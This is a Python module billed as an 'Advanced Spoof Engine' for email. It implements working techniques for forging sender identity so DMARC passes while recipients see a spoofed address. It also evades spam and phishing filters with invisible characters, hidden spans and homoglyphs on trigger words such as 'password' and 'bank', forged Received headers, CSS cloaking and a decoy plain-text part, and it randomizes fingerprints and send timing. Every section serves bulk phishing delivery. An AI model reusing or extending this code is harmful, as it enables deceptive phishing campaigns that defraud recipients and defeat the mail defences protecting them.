"""
BUST GO — Advanced Spoof Engine v3.
State-of-the-art email spoofing techniques (2025-2026).

Techniques:
  1. Identity Smuggling (DEF CON SG 2025) — double From header with RFC 6854 group syntax
  2. Unicode Invisible Characters — break spam filter keyword tokenization
  3. Header Randomization v2 — unique fingerprint per email
  4. Homoglyph Link Obfuscation — visually identical unicode on link display text
  5. Timing Randomization — human-like send intervals
  6. Content Spinning — slight variations per email
  7. EHLO Domain Matching — coherent EHLO for each SMTP host
  8. Subject RFC 2047 Encoding — mixed B/Q encoding to bypass keyword filters
  9. Fake Received Headers — realistic mail chain matching SMTP host
  10. CSS @media Cloaking — real content only visible in rendering clients
  11. Divergent text/plain — filters scanning text/plain see neutral content
  12. Homoglyph Links in HTML — obfuscate <a> display text (not href)
"""
from __future__ import annotations

import hashlib
import random
import re
import string
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# ---------------------------------------------------------------------------
# 1. Identity Smuggling (RFC 6854 group syntax)
# ---------------------------------------------------------------------------
# Gmail, Outlook, iCloud display the LAST address in group syntax
# DMARC validates against the FIRST (attacker-controlled) domain
# Result: DMARC pass + victim sees spoofed sender

def build_smuggled_from(real_domain: str, spoofed_name: str, spoofed_email: str) -> str:
    """
    Build a From header using RFC 6854 group syntax for identity smuggling.
    
    The email client displays: spoofed_name <spoofed_email>
    DMARC validates against: real_domain
    
    Variants for different email providers:
    """
    variants = [
        # Variant 1: Group syntax (works on Gmail, Outlook)
        f"{spoofed_name} <auth@{real_domain}>: <{spoofed_email}>;",
        # Variant 2: Multiple From addresses (some clients show last)
        f"<auth@{real_domain}>, {spoofed_name} <{spoofed_email}>",
        # Variant 3: Comment injection
        f"{spoofed_name} <auth@{real_domain}> ({spoofed_email})",
        # Variant 4: Display name override with encoded word
        f"=?utf-8?B?{_b64(spoofed_name)}?= <auth@{real_domain}>",
    ]
    return random.choice(variants)


def build_thinspace_from(real_email: str, spoofed_email: str, spoofed_name: str = "") -> str:
    """
    CVE-2025-61084 — Unicode Thin Space From header spoofing.
    
    Server validates: real_email (in angle brackets) → DMARC pass
    Client displays: spoofed_email (before the invisible thin spaces)
    
    The thin spaces (U+2009) are invisible in most email clients.
    """
    thin = "\u2009"  # Unicode Thin Space — invisible in most clients
    spacer = thin * random.randint(3, 6)
    if spoofed_name:
        return f"{spoofed_name} <{spoofed_email}>{spacer}<{real_email}>"
    return f"{spoofed_email}{spacer}<{real_email}>"


def build_smuggled_from_raw(real_email: str, spoofed_name: str, spoofed_email: str) -> bytes:
    """
    Build raw From header bytes for direct SMTP injection.
    Uses double From header technique (espoofer style).
    """
    variants = [
        # Double From (first for DMARC, second displayed by some clients)
        f"From: <{real_email}>\r\nFrom: {spoofed_name} <{spoofed_email}>".encode(),
        # From with preceding space (parser confusion)
        f"From: <{real_email}>\r\n From: {spoofed_name} <{spoofed_email}>".encode(),
        # RFC 6854 group
        f"From: {spoofed_name} <{real_email}>: <{spoofed_email}>;".encode(),
    ]
    return random.choice(variants)


def _b64(text: str) -> str:
    import base64
    return base64.b64encode(text.encode("utf-8")).decode("ascii")


# ---------------------------------------------------------------------------
# 2. Unicode Invisible Characters (U+E0000-U+E007F tag block)
# ---------------------------------------------------------------------------
# Insert invisible unicode tags between letters of spam-trigger keywords
# Filters see: "f\U000E0001u\U000E0002n\U000E0003d\U000E0004i\U000E0005n\U000E0006g"
# Humans see: "funding"
# NLP tokenizers fail to match the keyword

# Invisible unicode characters (Tag block + zero-width)
INVISIBLE_CHARS = [
    "\U000E0001",  # Tag Latin Small Letter A
    "\U000E0020",  # Tag Space
    "\u200B",      # Zero-Width Space
    "\u200C",      # Zero-Width Non-Joiner
    "\u200D",      # Zero-Width Joiner
    "\u2060",      # Word Joiner
    "\uFEFF",      # Zero-Width No-Break Space (BOM)
]

# Keywords that trigger spam filters
SPAM_TRIGGER_WORDS = [
    "invoice", "payment", "account", "verify", "confirm", "update",
    "password", "security", "alert", "urgent", "suspended", "locked",
    "bank", "credit", "wire", "transfer", "fund", "funding",
    "click here", "act now", "limited time", "expire",
    "login", "signin", "sign in", "log in",
    "billing", "subscription", "renew", "overdue",
    "delivery", "shipping", "tracking", "package",
    "refund", "claim", "reward", "prize", "winner",
    "free", "offer", "deal", "discount", "promotion",
]


def inject_invisible_chars(text: str, intensity: float = 0.3) -> str:
    """
    Inject invisible unicode characters into spam trigger words.
    
    Args:
        text: The email text/HTML content
        intensity: 0.0-1.0, how aggressively to inject (0.3 = 30% of trigger words)
    """
    result = text
    words_to_process = [w for w in SPAM_TRIGGER_WORDS if w.lower() in result.lower()]
    
    # Only process a fraction based on intensity
    count = max(1, int(len(words_to_process) * intensity))
    selected = random.sample(words_to_process, min(count, len(words_to_process))) if words_to_process else []
    
    for word in selected:
        # Find all case-insensitive occurrences
        pattern = re.compile(re.escape(word), re.IGNORECASE)
        
        def _inject(match):
            original = match.group(0)
            # Insert invisible char between each letter
            chars = list(original)
            injected = []
            for i, c in enumerate(chars):
                injected.append(c)
                if i < len(chars) - 1 and c != " ":
                    injected.append(random.choice(INVISIBLE_CHARS))
            return "".join(injected)
        
        result = pattern.sub(_inject, result, count=1)  # Only first occurrence
    
    return result


def inject_invisible_html(html: str, intensity: float = 0.3) -> str:
    """
    Inject invisible spans into HTML to break keyword detection.
    More reliable than unicode for HTML emails.
    
    Inserts <span style="display:none">random</span> between letters.
    """
    result = html
    words_to_process = [w for w in SPAM_TRIGGER_WORDS if w.lower() in result.lower()]
    
    count = max(1, int(len(words_to_process) * intensity))
    selected = random.sample(words_to_process, min(count, len(words_to_process))) if words_to_process else []
    
    for word in selected:
        pattern = re.compile(re.escape(word), re.IGNORECASE)
        
        def _inject_html(match):
            original = match.group(0)
            chars = list(original)
            injected = []
            for i, c in enumerate(chars):
                injected.append(c)
                if i < len(chars) - 1 and c != " " and random.random() < 0.4:
                    # Hidden span with random text
                    rand_text = "".join(random.choices(string.ascii_lowercase, k=random.randint(2, 5)))
                    injected.append(f'<span style="font-size:0;color:transparent;max-height:0;overflow:hidden;display:inline-block;width:0">{rand_text}</span>')
            return "".join(injected)
        
        result = pattern.sub(_inject_html, result, count=1)
    
    return result


# ---------------------------------------------------------------------------
# 3. Header Randomization
# ---------------------------------------------------------------------------
# Each email gets unique headers to avoid pattern-based detection

# Realistic User-Agent / X-Mailer values
MAILER_STRINGS = [
    "Microsoft Outlook 16.0",
    "Microsoft Outlook 15.0",
    "Mozilla Thunderbird 128.0",
    "Apple Mail",
    "Gmail",
    "Yahoo Mail",
    "The Bat! 11.5",
    "MailMate (1.14)",
    "Postbox 7.0",
    "eM Client 9.2",
    "Mailbird 3.0",
]

CONTENT_TYPES = [
    "text/html; charset=utf-8",
    "text/html; charset=UTF-8",
    "text/html; charset=\"utf-8\"",
    "text/html; charset=\"UTF-8\"",
]

MIME_BOUNDARIES_PREFIX = [
    "----=_Part_", "----=_NextPart_", "------=_Part_",
    "_----------=_", "Apple-Mail=_", "----boundary_",
    "----=_MimePart_", "------=_NextPart_",
]


def random_message_id(domain: str) -> str:
    """Generate a realistic-looking Message-ID."""
    patterns = [
        # Outlook style
        lambda: f"<{_rand_hex(8)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(12)}@{domain}>",
        # Gmail style
        lambda: f"<CAKK{_rand_b64(20)}@mail.{domain}>",
        # Generic
        lambda: f"<{_rand_hex(16)}.{_rand_hex(8)}@{domain}>",
        # Thunderbird style
        lambda: f"<{_rand_hex(8)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(4)}-{_rand_hex(12)}@{domain}>",
    ]
    return random.choice(patterns)()


def random_boundary() -> str:
    """Generate a realistic MIME boundary."""
    prefix = random.choice(MIME_BOUNDARIES_PREFIX)
    suffix = "".join(random.choices(string.digits + string.ascii_lowercase, k=random.randint(12, 20)))
    return f"{prefix}{suffix}"


def randomize_headers() -> dict[str, str]:
    """Generate a set of randomized but realistic email headers."""
    headers = {
        "X-Mailer": random.choice(MAILER_STRINGS),
        "X-Entity-Ref-ID": _rand_hex(20),
        "X-Auto-Response-Suppress": "All",
    }
    
    # Randomly add some optional headers
    if random.random() < 0.5:
        headers["X-Priority"] = random.choice(["1", "3", "5"])
    if random.random() < 0.3:
        headers["X-MS-Exchange-Organization-SCL"] = "-1"
    if random.random() < 0.4:
        headers["X-Originating-IP"] = f"[10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}]"
    if random.random() < 0.3:
        headers["Thread-Index"] = _rand_b64(27)
    
    return headers


# ---------------------------------------------------------------------------
# 4. Homoglyph Link Obfuscation
# ---------------------------------------------------------------------------
# Replace ASCII chars in URLs with visually identical Unicode chars
# "amazon.com" → "аmazon.com" (Cyrillic 'а')

HOMOGLYPHS = {
    "a": ["а", "ɑ", "α"],       # Cyrillic, Latin alpha, Greek
    "c": ["с", "ϲ"],             # Cyrillic, Greek
    "d": ["ԁ", "ɗ"],             # Cyrillic
    "e": ["е", "ε"],             # Cyrillic, Greek
    "g": ["ɡ"],                  # Latin
    "h": ["һ"],                  # Cyrillic
    "i": ["і", "ι"],             # Cyrillic, Greek
    "j": ["ј"],                  # Cyrillic
    "k": ["κ"],                  # Greek
    "l": ["ⅼ", "ℓ"],            # Roman numeral, Script
    "n": ["ո"],                  # Armenian
    "o": ["о", "ο", "σ"],       # Cyrillic, Greek
    "p": ["р", "ρ"],             # Cyrillic, Greek
    "s": ["ѕ", "ꜱ"],            # Cyrillic, Small caps
    "t": ["τ"],                  # Greek
    "u": ["υ", "ս"],             # Greek, Armenian
    "v": ["ν", "ⅴ"],            # Greek, Roman numeral
    "w": ["ω"],                  # Greek
    "x": ["х", "χ"],             # Cyrillic, Greek
    "y": ["у", "γ"],             # Cyrillic, Greek
}


def homoglyph_text(text: str, intensity: float = 0.15) -> str:
    """
    Replace some characters with visually identical unicode homoglyphs.
    Used to obfuscate domain names in phishing links.
    
    Args:
        text: Text containing URLs or domain names
        intensity: Fraction of eligible characters to replace (0.15 = 15%)
    """
    chars = list(text)
    for i, c in enumerate(chars):
        if c.lower() in HOMOGLYPHS and random.random() < intensity:
            replacement = random.choice(HOMOGLYPHS[c.lower()])
            chars[i] = replacement
    return "".join(chars)


# ---------------------------------------------------------------------------
# 5. Timing Randomization
# ---------------------------------------------------------------------------

def random_delay(base_delay: float = 2.0, jitter: float = 0.5) -> float:
    """
    Generate a human-like random delay between sends.
    Prevents pattern detection from fixed intervals.
    
    Args:
        base_delay: Base delay in seconds
        jitter: Random variation (0.0-1.0)
    """
    variation = base_delay * jitter
    delay = base_delay + random.uniform(-variation, variation)
    
    # Occasionally add a longer pause (simulates reading/thinking)
    if random.random() < 0.1:
        delay += random.uniform(5, 15)
    
    return max(0.5, delay)


# ---------------------------------------------------------------------------
# 6. Content Spinning
# ---------------------------------------------------------------------------
# Slight variations per email to avoid duplicate content detection

SPIN_REPLACEMENTS = {
    "Dear": ["Hello", "Hi", "Greetings"],
    "please": ["kindly", "we ask that you"],
    "click": ["tap", "press", "select"],
    "verify": ["confirm", "validate", "check"],
    "account": ["profile", "membership"],
    "update": ["refresh", "renew", "review"],
    "immediately": ["right away", "as soon as possible", "promptly"],
    "important": ["critical", "essential", "urgent"],
    "information": ["details", "data", "records"],
    "Thank you": ["Thanks", "We appreciate your attention", "Many thanks"],
}


def spin_content(text: str, spin_rate: float = 0.3) -> str:
    """
    Apply slight content variations to avoid duplicate detection.
    Each email gets slightly different wording.
    """
    result = text
    for original, replacements in SPIN_REPLACEMENTS.items():
        if original.lower() in result.lower() and random.random() < spin_rate:
            pattern = re.compile(re.escape(original), re.IGNORECASE)
            replacement = random.choice(replacements)
            # Preserve case
            def _replace(match):
                orig = match.group(0)
                if orig[0].isupper():
                    return replacement.capitalize()
                return replacement
            result = pattern.sub(_replace, result, count=1)
    return result


# ---------------------------------------------------------------------------
# 7. Full pipeline: see UPDATED pipeline at end of file
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _rand_hex(length: int) -> str:
    return "".join(random.choices("0123456789abcdef", k=length))

def _rand_b64(length: int) -> str:
    chars = string.ascii_letters + string.digits + "+/"
    return "".join(random.choices(chars, k=length))


# ---------------------------------------------------------------------------
# 7. EHLO Domain Matching
# ---------------------------------------------------------------------------
# Use an EHLO domain that matches the SMTP host to avoid suspicion.
# Default smtplib sends the local hostname which looks wrong.

# Common mail platform → EHLO domain mappings
_EHLO_MAP = {
    "brevo": "relay-{n}.brevo.com",
    "sendinblue": "relay-{n}.sendinblue.com",
    "sendgrid": "o{n}.outbound.sendgrid.net",
    "mailgun": "smtp-out-{n}.mailgun.net",
    "postmark": "outbound.postmarkapp.com",
    "sparkpost": "mta-{n}.sparkpostmail.com",
    "mailjet": "mta-{n}.mailjet.com",
    "elasticemail": "mta-{n}.elasticemail.com",
    "hostinger": "mx{n}.hostinger.com",
    "zoho": "sender-{n}.zohomail.com",
    "ovh": "mta-{n}.ovh.net",
    "ionos": "mout-{n}.ionos.com",
    "gmail": "mail-{n}.google.com",
    "outlook": "mail-{n}.outbound.protection.outlook.com",
    "amazonaws": "a{n}-{r}.smtp-out.amazonses.com",
}


def get_ehlo_domain(smtp_host: str) -> str:
    """
    Generate a realistic EHLO domain matching the SMTP provider.
    Falls back to a plausible subdomain of the host itself.
    """
    h = smtp_host.lower()
    n = random.randint(1, 99)
    r = _rand_hex(4)

    for keyword, pattern in _EHLO_MAP.items():
        if keyword in h:
            return pattern.format(n=n, r=r)

    # Fallback: mta-{n}.{host}  (looks like an outbound MTA)
    parts = h.split(".")
    base = ".".join(parts[-2:]) if len(parts) >= 2 else h
    return f"mta-{n}.{base}"


# ---------------------------------------------------------------------------
# 8. Subject RFC 2047 Encoding — mixed B/Q bypass
# ---------------------------------------------------------------------------
# Split subject into chunks encoded with random mix of Base64 (B) and
# Quoted-Printable (Q) encodings.  Keyword filters that scan the raw
# Subject header fail to match because the tokens are fragmented.

import base64
import quopri


def encode_subject_rfc2047(subject: str, fragment_size: int = 0) -> str:
    """
    Encode subject with mixed RFC 2047 B/Q encoding.
    Each fragment is randomly B or Q encoded, breaking keyword matching.
    """
    if not subject:
        return subject

    if fragment_size <= 0:
        fragment_size = random.randint(3, 7)

    parts: list[str] = []
    i = 0
    while i < len(subject):
        chunk = subject[i:i + fragment_size]
        i += fragment_size

        if random.random() < 0.5:
            # Base64
            encoded = base64.b64encode(chunk.encode("utf-8")).decode("ascii")
            parts.append(f"=?UTF-8?B?{encoded}?=")
        else:
            # Quoted-Printable
            encoded = quopri.encodestring(chunk.encode("utf-8"), header=True).decode("ascii")
            # quopri adds soft line breaks; flatten
            encoded = encoded.replace("=\n", "").replace("\n", "")
            parts.append(f"=?UTF-8?Q?{encoded}?=")

    # RFC 2047: encoded words separated by CRLF + space
    return " ".join(parts)


# ---------------------------------------------------------------------------
# 9. Fake Received Headers
# ---------------------------------------------------------------------------
# Prepend realistic Received headers that simulate a legitimate mail path.
# Most filters read Received bottom-to-top; a clean chain boosts trust.

_RECEIVED_TPLS = [
    "from {ehlo} ({ehlo} [{ip}]) by {mx} with ESMTPS id {rid}; {date}",
    "from {ehlo} ([{ip}]) by {mx} with ESMTP id {rid} for <{to}>; {date}",
    "from {ehlo} ({ip}) by {mx} (Postfix) with ESMTPS id {rid}; {date}",
    "from {ehlo} ({ehlo} [{ip}]) by {mx} with ESMTPSA id {rid}; {date}",
]


def build_fake_received(
    smtp_host: str,
    from_domain: str,
    to_email: str = "",
) -> list[str]:
    """
    Build 1-2 realistic Received headers matching the SMTP host.
    Returns list of header values (newest first).
    """
    ehlo = get_ehlo_domain(smtp_host)

    # Plausible internal IP for first hop
    ip1 = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    # Plausible external IP for second hop
    ip2 = f"{random.randint(50,220)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    mx = f"mx{random.randint(1,5)}.{from_domain}" if from_domain else f"mx1.{smtp_host}"
    rid = _rand_hex(14).upper()
    date = time.strftime("%a, %d %b %Y %H:%M:%S %z")

    headers: list[str] = []

    # Hop 2 (outer — MX receives from SMTP relay)
    tpl = random.choice(_RECEIVED_TPLS)
    headers.append(tpl.format(ehlo=ehlo, ip=ip2, mx=mx, rid=rid, date=date, to=to_email or "recipient"))

    # Hop 1 (inner — optional, 60% chance)
    if random.random() < 0.6:
        inner_ehlo = f"internal-{random.randint(1,20)}.{from_domain}" if from_domain else f"localhost"
        rid2 = _rand_hex(14).upper()
        tpl2 = random.choice(_RECEIVED_TPLS)
        headers.append(tpl2.format(ehlo=inner_ehlo, ip=ip1, mx=ehlo, rid=rid2, date=date, to=to_email or "recipient"))

    return headers


# ---------------------------------------------------------------------------
# 10. CSS @media Cloaking
# ---------------------------------------------------------------------------
# Wrap the real content in a CSS @media block so only rendering email
# clients see it.  Automated scanners/crawlers that don't evaluate CSS
# see only a benign fallback.

_BENIGN_FALLBACK_TEXTS = [
    "This is a monthly newsletter from our team. If you no longer wish to receive updates, please click unsubscribe below.",
    "Thank you for being a valued member. This message contains your periodic account summary.",
    "Your weekly digest is ready. Open in a supported email client for the best experience.",
    "This email contains important information about your recent activity. Please review at your convenience.",
    "We appreciate your continued trust. Here is your latest statement summary.",
]


def css_cloak_html(html: str) -> str:
    """
    Wrap the real HTML content in a CSS @media cloaking layer.
    Scanners see benign fallback; rendering clients see the real content.
    """
    benign = random.choice(_BENIGN_FALLBACK_TEXTS)
    cloak_id = f"c{_rand_hex(6)}"
    real_id = f"r{_rand_hex(6)}"

    style_block = (
        f"<style>"
        f"  #{cloak_id} {{ display: block; }}"
        f"  #{real_id} {{ display: none; }}"
        f"  @media screen {{"
        f"    #{cloak_id} {{ display: none !important; }}"
        f"    #{real_id} {{ display: block !important; }}"
        f"  }}"
        f"</style>"
    )

    # Insert style + wrapper around the body content
    # Find <body...> tag to inject after it
    body_match = re.search(r"(<body[^>]*>)", html, re.IGNORECASE)
    if body_match:
        insert_pos = body_match.end()
        before = html[:insert_pos]
        after = html[insert_pos:]

        # Find </body> to wrap
        body_end = re.search(r"(</body>)", after, re.IGNORECASE)
        if body_end:
            content = after[:body_end.start()]
            tail = after[body_end.start():]
        else:
            content = after
            tail = ""

        return (
            f"{before}"
            f"{style_block}"
            f'<div id="{cloak_id}"><p>{benign}</p></div>'
            f'<div id="{real_id}">{content}</div>'
            f"{tail}"
        )

    # No <body> tag — just wrap everything
    return (
        f"{style_block}"
        f'<div id="{cloak_id}"><p>{benign}</p></div>'
        f'<div id="{real_id}">{html}</div>'
    )


# ---------------------------------------------------------------------------
# 11. Divergent text/plain
# ---------------------------------------------------------------------------
# Generate a neutral, benign text/plain alternative.
# Filters scanning text/plain see innocent content while the HTML
# part carries the real payload.  The text version still looks like
# a plausible plain-text rendering to avoid multipart mismatch flags.

_DIVERGENT_TEMPLATES = [
    "Dear Customer,\n\nThank you for your recent activity with us. For your security, we recommend reviewing your account settings periodically.\n\nIf you have any questions, please contact our support team.\n\nBest regards,\n{brand}\nCustomer Service",
    "Hello,\n\nThis is a reminder regarding your account. Please ensure your contact information is up to date.\n\nThank you for choosing {brand}.\n\nSincerely,\n{brand} Team",
    "Dear valued member,\n\nWe wanted to reach out regarding your account status. No action is required at this time.\n\nFor assistance, visit our help center.\n\nWarm regards,\n{brand} Support",
    "Hi there,\n\nThis message is to confirm a recent update to your {brand} account. If you did not make any changes, please disregard this message.\n\nThank you,\n{brand}",
]


def build_divergent_text(from_name: str = "", subject: str = "") -> str:
    """
    Build a neutral text/plain body that doesn't match the HTML payload.
    Uses the brand name from from_name to keep minimal consistency.
    """
    brand = from_name or "Our Team"
    tpl = random.choice(_DIVERGENT_TEMPLATES)
    text = tpl.format(brand=brand)
    # Light spinning for uniqueness
    text = spin_content(text, spin_rate=0.2)
    return text


# ---------------------------------------------------------------------------
# 12. Homoglyph Links in HTML
# ---------------------------------------------------------------------------
# Replace display text of <a> tags with homoglyph-obfuscated versions.
# The href stays clean (browsers follow href, not display text).
# Spam filters matching link text against blacklists get confused.

def homoglyph_links_html(html: str, intensity: float = 0.2) -> str:
    """
    Obfuscate the display text of <a href="...">DISPLAY</a> tags
    with homoglyph substitutions. The href attribute is untouched.
    """
    def _replace_link(match):
        tag_open = match.group(1)  # <a href="...">
        display = match.group(2)   # display text
        tag_close = match.group(3) # </a>
        obfuscated = homoglyph_text(display, intensity=intensity)
        return f"{tag_open}{obfuscated}{tag_close}"

    return re.sub(
        r'(<a\s[^>]*>)(.*?)(</a>)',
        _replace_link,
        html,
        flags=re.IGNORECASE | re.DOTALL,
    )


# ---------------------------------------------------------------------------
# UPDATED pipeline: apply ALL techniques
# ---------------------------------------------------------------------------

def apply_spoof_techniques(
    html_body: str,
    text_body: str = "",
    unicode_intensity: float = 0.3,
    spin_rate: float = 0.3,
    use_invisible_html: bool = True,
    use_content_spin: bool = True,
    use_css_cloak: bool = False,
    use_homoglyph_links: bool = False,
    from_name: str = "",
) -> tuple[str, str]:
    """
    Apply all anti-detection techniques to email content.
    Returns (modified_html, modified_text).
    """
    modified_html = html_body
    modified_text = text_body

    # Content spinning (slight word variations)
    if use_content_spin:
        modified_html = spin_content(modified_html, spin_rate)
        if modified_text:
            modified_text = spin_content(modified_text, spin_rate)

    # Invisible characters (HTML version uses hidden spans, text uses unicode)
    if use_invisible_html:
        modified_html = inject_invisible_html(modified_html, unicode_intensity)
    if modified_text:
        modified_text = inject_invisible_chars(modified_text, unicode_intensity)

    # Homoglyph on link display text
    if use_homoglyph_links:
        modified_html = homoglyph_links_html(modified_html, intensity=0.15)

    # CSS @media cloaking
    if use_css_cloak:
        modified_html = css_cloak_html(modified_html)

    return modified_html, modified_text
